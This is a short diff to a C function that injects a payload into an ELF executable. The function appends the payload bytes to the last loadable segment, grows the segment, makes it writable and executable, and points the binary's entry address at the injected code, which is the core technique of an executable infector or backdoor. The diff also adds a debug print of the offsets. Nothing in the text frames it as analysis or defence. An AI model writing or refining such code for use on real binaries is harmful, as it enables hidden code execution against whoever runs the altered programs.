@@ -24,9 +24,11 @@ void embed_payload(void *map, unsigned char *payload, size_t payload_size)
         return;
 
     size_t new_offset = last_load->p_offset + last_load->p_filesz;
-    size_t new_vaddr = last_load->p_vaddr + last_load->p_memsz;
+    printf("[embed_payload] p_offset=0x%lx, p_filesz(before)=0x%lx, new_offset=0x%lx, payload_size=0x%lx\n",
+        last_load->p_offset, last_load->p_filesz, new_offset, payload_size);
     memcpy((char *)map + new_offset, payload, payload_size);
     last_load->p_filesz += payload_size;
     last_load->p_memsz += payload_size;
-    ehdr->e_entry = new_vaddr;
+    last_load->p_flags |= PF_X | PF_W | PF_R; 
+    ehdr->e_entry = last_load->p_vaddr + last_load->p_memsz - payload_size;
 }
